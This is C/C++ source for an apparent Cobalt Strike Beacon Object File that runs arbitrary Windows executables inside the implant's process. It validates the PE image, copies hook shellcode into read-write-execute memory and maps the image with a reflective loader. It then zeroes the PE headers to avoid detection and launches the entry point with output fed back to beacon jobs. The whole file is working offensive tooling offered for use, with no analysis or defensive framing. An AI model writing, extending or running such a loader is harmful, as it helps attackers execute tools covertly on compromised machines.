extern "C" {
// clang-format off
#include "inlinecommon.h"
// clang-format on

#include <string.h>

#include "ReflectiveLoaderEx.c"
#include "c2scstartup.cc"
#include "globalshareddata.cc"
#include "hooks/simplelist1.cc"
#include "jobs1.cc"
#include "jobs2.cc"
#include "seh.cc"

WINBASEAPI NTSTATUS NTAPI NtFlushInstructionCache(HANDLE ProcessHandle,
                                                  PVOID BaseAddress,
                                                  ULONG NumberOfBytesToFlush);

#ifdef _WIN64
#ifdef _DEBUG
#include "hooks/hooks_x64d.h"
#define HOOKS HOOKS_X64D
#define HOOKS_EXTRA HOOKS_X64D_EXTRA
#else
#include "hooks/hooks_x64.h"
#define HOOKS HOOKS_X64
#define HOOKS_EXTRA HOOKS_X64_EXTRA
#endif
#else
#ifdef _DEBUG
#include "hooks/hooks_x86d.h"
#define HOOKS HOOKS_X86D
#define HOOKS_EXTRA HOOKS_X86D_EXTRA
#else
#include "hooks/hooks_x86.h"
#define HOOKS HOOKS_X86
#define HOOKS_EXTRA HOOKS_X86_EXTRA
#endif
#endif

#define STARTS_WITH_I(s, prefix) \
  (_strnicmp((s), prefix, sizeof(prefix) - 1) == 0)

DWORD RvaToFileOffset(PIMAGE_NT_HEADERS ntHeaders, DWORD rva) {
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
  for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
    if (rva >= section->VirtualAddress &&
        rva < section->VirtualAddress + section->SizeOfRawData) {
      return rva - section->VirtualAddress + section->PointerToRawData;
    }
  }
  return 0;
}

BOOL CheckPEImage(void *peImage, int peImageSize, BOOL force) {
  PBYTE p = (PBYTE)peImage;
  PIMAGE_DOS_HEADER dos = NULL;
  PIMAGE_NT_HEADERS nt = NULL;
  DWORD rva = 0;
  PIMAGE_RESOURCE_DIRECTORY res = NULL;
  PIMAGE_RESOURCE_DIRECTORY_ENTRY rese = NULL;
  WORD resid = 0;
  PIMAGE_IMPORT_DESCRIPTOR imp = NULL;
  LPSTR n = NULL;

  // Check if the PE image is empty
  if (!peImage || !peImageSize) {
    goto empty;
  }

  if (force) {
    return TRUE;
  }

  // Check the DOS header
  if ((UINT)peImageSize < sizeof(IMAGE_DOS_HEADER)) {
    goto tooSmall;
  }
  dos = (PIMAGE_DOS_HEADER)p;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
    goto invalidMagic;
  }

  // Check the NT header
  nt = (PIMAGE_NT_HEADERS)(p + dos->e_lfanew);
  if ((UINT)peImageSize < dos->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
    goto tooSmall;
  }
  if (nt->Signature != IMAGE_NT_SIGNATURE) {
    goto invalidMagic;
  }
  if (nt->FileHeader.Machine != (sizeof(PVOID) == 4
                                     ? IMAGE_FILE_MACHINE_I386
                                     : IMAGE_FILE_MACHINE_AMD64)) {
    goto invalidMagic;
  }

  // Check the optional header (TLS and .NET)
  if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
    goto invalidMagic;
  }
  if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
          .VirtualAddress) {
    goto tls;
  }
  if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR]
          .VirtualAddress) {
    goto dotnet;
  }

  // Check the Win32 resources
  rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE]
            .VirtualAddress;
  if (rva) {
    res = (PIMAGE_RESOURCE_DIRECTORY)(p + RvaToFileOffset(nt, rva));
    if (res->NumberOfNamedEntries) {
      goto win32res;
    }
    rese = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(res + 1);
    for (WORD i = 0; i < res->NumberOfIdEntries; i++) {
      resid = rese[i].Id;
      if (resid != (SIZE_T)RT_ICON && resid != (SIZE_T)RT_GROUP_ICON &&
          resid != (SIZE_T)RT_VERSION && resid != (SIZE_T)RT_MANIFEST) {
        goto win32res;
      }
    }
  }

  // Check the import table
  rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
            .VirtualAddress;
  if (rva) {
    imp = (PIMAGE_IMPORT_DESCRIPTOR)(p + RvaToFileOffset(nt, rva));
    for (; imp && imp->Name; imp++) {
      n = (LPSTR)(p + RvaToFileOffset(nt, imp->Name));
      if (STARTS_WITH_I(n, "MSVCR") || STARTS_WITH_I(n, "MSVCP") ||
          STARTS_WITH_I(n, "VCRUNTIME")) {
        goto vcrt;
      }
    }
  }

  return TRUE;

empty:
  PRINTF_ERR("The PE image is empty.");
  return FALSE;
tooSmall:
  PRINTF_ERR("The size of the PE image is too small: %d", peImageSize);
  return FALSE;
invalidMagic:
  PRINTF_ERR("Invalid PE headers magic.");
  return FALSE;
tls:
  PRINTF_ERR("Static TLS and TLS callbacks are not supported.");
  return FALSE;
dotnet:
  PRINTF_ERR("Loading .NET PE image is not supported.");
  return FALSE;
win32res:
  PRINTF_ERR("Win32 resources are not supported.");
  return FALSE;
vcrt:
  PRINTF_ERR("The Visual C++ runtime should be statically linked: %s", n);
  return FALSE;
}

BOOL ToWideString(LPSTR s, LPWSTR *ws) {
  int size = (int)strlen(s) * 2 + 2;
  *ws = (LPWSTR)malloc(size);
  if (!*ws) {
    PRINTF_ERR("Failed to allocate wide string.");
    return FALSE;
  }
  if (!toWideChar(s, *ws, size)) {
    PRINTF_ERR("Failed to convert ansi string to wide string.");
    return FALSE;
  }
  return TRUE;
}

void PrintHookResultError(HookResult result, HookControl id) {
  switch (result) {
    case HookResultErrorInvalidArgument:
      PRINTF_ERR("Invalid argument for HookControlEntry(%d).", id);
      break;
    case HookResultErrorCreatePipeServer:
      PRINTF_ERR("Failed to create pipe server.");
      break;
    case HookResultErrorCreateSimpleList:
      PRINTF_ERR("Failed to create simple list.");
      break;
    case HookResultErrorGetModuleHandle:
      PRINTF_ERR("Failed to get kernel32.dll/msvcrt.dll image base.");
      break;
    case HookResultErrorStartNewThread:
      PRINTF_ERR("Failed to create new thread to run exe entry-point.");
      break;
    default:
      PRINTF_ERR("Failed to call HookControlEntry(%d): %x", id, result);
      break;
  }
}

BOOL LoadHook(PVOID *hookBase, HookControlEntryProc *hookControlEntry) {
#ifdef HOOKS_DLL
  *hookBase = NULL;
  *hookControlEntry = (HookControlEntryProc)GetProcAddress(
      LoadLibraryA("hooks.dll"), "HookControlEntry");
#else
  *hookBase = VirtualAlloc(NULL, sizeof(HOOKS), MEM_RESERVE | MEM_COMMIT,
                           PAGE_EXECUTE_READWRITE);
  // TODO: allocate then set RWX, add padding before and after code.
  if (!*hookBase) {
    PRINTF_ERR("Failed to allocate hooks code.");
    return false;
  }
  memcpy(*hookBase, HOOKS, sizeof(HOOKS));
  C2SCInitialize(*hookBase, HOOKS_EXTRA);
  *hookControlEntry = (HookControlEntryProc)*hookBase;
#endif
  return true;
}

void UnloadHook(PVOID hookBase) {
#ifdef HOOKS_DLL
  // Nothing to do
#else
  if (hookBase) VirtualFree(hookBase, 0, MEM_RELEASE);
#endif
}

BOOL CreateOutput(HookOutput **output, BOOL isCpp, int jobVersion,
                  const char *jobDescription, JobEntry ***jobList, int *jobId) {
  HookOutput *o = (HookOutput *)calloc(1, sizeof(HookOutput));
  if (!o) {
    PRINTF_ERR("Failed to allocate hook output.");
    return FALSE;
  }
  *output = o;
  o->Type = isCpp ? CALLBACK_OUTPUT : CALLBACK_OUTPUT_UTF8;
  if (jobVersion) {
    if (SimpleAddJob(jobVersion, o->Type, jobDescription, jobList, jobId,
                     &o->JobOutputWriteHandle)) {
      TRACEF("Job %d was added. Never use 'jobkill' for this PE image!",
             *jobId);
    } else {
      PRINTF_ERR(
          "Failed to add job. Fall back to normal async log. Use "
          "'inline-log-pe' to fetch logs manually.");
    }
  }
  if (!SimpleListAlloc(&o->Logs, sizeof(LogEntry) * 64)) {
    PRINTF_ERR("Failed to allocate hook log list.");
    return FALSE;
  }
  return TRUE;
}

void FreeOutput(HookOutput *output, JobEntry **jobList, int jobId) {
  if (output) {
    SimpleListForEach(&output->Logs, LogEntry, log, free(log->Text));
    SimpleListFree(&output->Logs);
    free(output);
  }
  if (jobList) SimpleRemoveJob(jobList, jobId);
}

BOOL LoadPEImage(PVOID peImage, PVOID myGetProcAddress, BOOL enableSEH,
                 PVOID *imageBase, PVOID *entryPoint, PVOID *seh) {
  DWORD imageSize =
      ((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                           ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
          ->OptionalHeader.SizeOfImage;
  *imageBase = peImage;
  *entryPoint = ReflectiveLoaderEx(imageBase, (PVOID)LoadLibraryA,
                                   myGetProcAddress, (PVOID)VirtualAlloc,
                                   (PVOID)NtFlushInstructionCache, enableSEH);
  TRACEF("ReflectiveLoaderEx done.");
  if (enableSEH) {
    *seh = EnableSEH(*imageBase);
    TRACEF("SEH was enabled.");
    // Zero PE headers
    memset(peImage, 0,
           ((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                                ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
               ->OptionalHeader.SizeOfHeaders);
  }
  PRINTF("PE image was loaded. (imageBase: %p, imageSize: %x, entryPoint: %p)",
         *imageBase, (UINT)imageSize, *entryPoint);
  return TRUE;
}

void UnloadPEImage(PVOID imageBase, PVOID seh, BOOL enableSEH) {
  if (imageBase) {
    if (enableSEH) {
#ifdef _WIN64
      RtlDeleteFunctionTable((PRUNTIME_FUNCTION)seh);
#else
      *(PVOID *)seh = NULL;
#endif
    }
    VirtualFree(imageBase, 0, MEM_RELEASE);
  }
}

BOOL SetLoadedPEImage(LoadedPEImage **peImage, PVOID imageBase,
                      JobEntry **jobList, int jobId, HookOutput *output,
                      LPSTR commandLineA) {
  GlobalSharedData *sharedData = GetGlobalSharedData();
  int index = 0;
  for (; index < LoadedPEImageMax; index++) {
    if (!sharedData->PEImages[index].ImageBase) {
      break;
    }
  }
  if (index == LoadedPEImageMax) {
    PRINTF_ERR("Too many loaded PE images. Can't add to PEImages.");
    return FALSE;
  }
  LoadedPEImage *p = *peImage = &sharedData->PEImages[index];
  p->ImageBase = imageBase;
  p->IsRunning = FALSE;
  p->JobList = jobList;
  p->JobId = jobId;
  p->Output = output;
  p->CommandLineA = _strdup(commandLineA);
  if (!p->CommandLineA) {
    PRINTF_ERR("Failed to duplicate command-line string.");
    return FALSE;
  }
  sharedData->LastImageBase = imageBase;
  TRACEF("PE image %p was added to global shared data index %d.", imageBase,
         index);
  return TRUE;
}

void UnsetLoadedPEImage(LoadedPEImage *peImage) {
  if (peImage->CommandLineA) {
    free(peImage->CommandLineA);
  }
  *peImage = {};
}

HookResult InlineExecutePE(HookFeatures features, bool force, void *stdin_,
                           int stdinSize, void *peImage, int peImageSize,
                           char *commandLineA, int jobVersion,
                           void *hCompletionEvent, void **loadedImageBase) {
  TRACEF("Begin run pe.");

  // Load hook
  PVOID hookBase = NULL;
  HookControlEntryProc HookControlEntry = NULL;

  // Initialize hook
  LPWSTR commandLineW = NULL;  // temp
  HookOutput *output = NULL;   // owned by LoadedPEImage
  JobEntry **jobList = NULL;
  int jobId = 0;
  PVOID myGetProcAddress = NULL;
  HookResult result = HookResultErrorInvalidControl;

  // Load PE image
  PVOID imageBase = NULL;
  PVOID entryPoint = NULL;
  PVOID seh = NULL;

  // Gloabl shared data
  LoadedPEImage *loadedPEImage = NULL;

  /*
   * 1. Validate the PE image
   */

  TRACEF("1. Validate the PE image");

  if (!CheckPEImage(peImage, peImageSize, force)) goto err;
  if (force) {
    PRINTF("WARNING: Without validation, the PE image may not work correctly!");
  }

  /*
   * 2. Load hook
   */

  TRACEF("2. Load hook");

  if (!LoadHook(&hookBase, &HookControlEntry)) goto err;

  /*
   * 3. Initialize hook
   */

  TRACEF("3. Initialize hook");

  if (!ToWideString(commandLineA, &commandLineW)) goto err;
  if (!CreateOutput(&output, features & HookFeatureCpp, jobVersion,
                    commandLineA, &jobList, &jobId))
    goto err;
  result =
      HookControlEntry(HookControlCreate, features, stdin_, stdinSize,
                       commandLineA, commandLineW, output, &myGetProcAddress);
  if (result != HookResultSuccess) {
    PrintHookResultError(result, HookControlCreate);
    goto err;
  }

  /*
   * 4. Load PE image from memory
   */

  TRACEF("4. Load PE image from memory");

  if (!LoadPEImage(peImage, myGetProcAddress, features & HookFeatureCppSEH,
                   &imageBase, &entryPoint, &seh))
    goto err;

  /*
   * 5. Add PE image to global shared data and setup self unload
   */

  TRACEF("5. Add PE image to global shared data and setup self unload");

  if (!SetLoadedPEImage(&loadedPEImage, imageBase, jobList, jobId, output,
                        commandLineA))
    goto err;
  if (loadedImageBase) *loadedImageBase = imageBase;
  HookControlEntry(HookControlCreateSelfUnload, hookBase, imageBase, seh,
                   loadedPEImage, hCompletionEvent);

  /*
   * 6. Call exe entrypoint
   */

  TRACEF("6. Call exe entrypoint");

  result = HookControlEntry(HookControlStart, entryPoint);
  if (result != HookResultSuccess) {
    PrintHookResultError(result, HookControlStart);
    goto err;
  }
  TRACEF("Thread of exe entry-point was created.");
  loadedPEImage->IsRunning = TRUE;
  goto out;

err:
  UnsetLoadedPEImage(loadedPEImage);
  UnloadPEImage(imageBase, seh, features & HookFeatureCppSEH);
  FreeOutput(output, jobList, jobId);
  UnloadHook(hookBase);
out:
  if (commandLineW) free(commandLineW);

  TRACEF("End run pe.");

  return result;
}

#ifdef BOF
void go(char *argv, int argc) {
  // Parse arguments
  datap parser;
  BeaconDataParse(&parser, argv, argc);
  HookFeatures features = (HookFeatures)BeaconDataInt(&parser);
  bool force = !!BeaconDataInt(&parser);
  int stdinSize = 0;
  void *stdin_ = BeaconDataExtract(&parser, &stdinSize);
  int peImageSize = 0;
  void *peImage = BeaconDataExtract(&parser, &peImageSize);
  int commandLineASize = 0;
  char *commandLineA = BeaconDataExtract(&parser, &commandLineASize);
  int jobVersion = BeaconDataInt(&parser);
  TRACEF(
      "Arguments was parsed. (features: %x, force: %d, stdin: %p (%d bytes), "
      "peImage: %p (%d bytes), commandLineA: %s (%d bytes), jobVersion: %d)",
      features, force, stdin_, stdinSize, peImage, peImageSize, commandLineA,
      commandLineASize, jobVersion);

  InlineExecutePE(features, force, stdin_, stdinSize, peImage, peImageSize,
                  commandLineA, jobVersion, NULL, NULL);
}
#endif
}
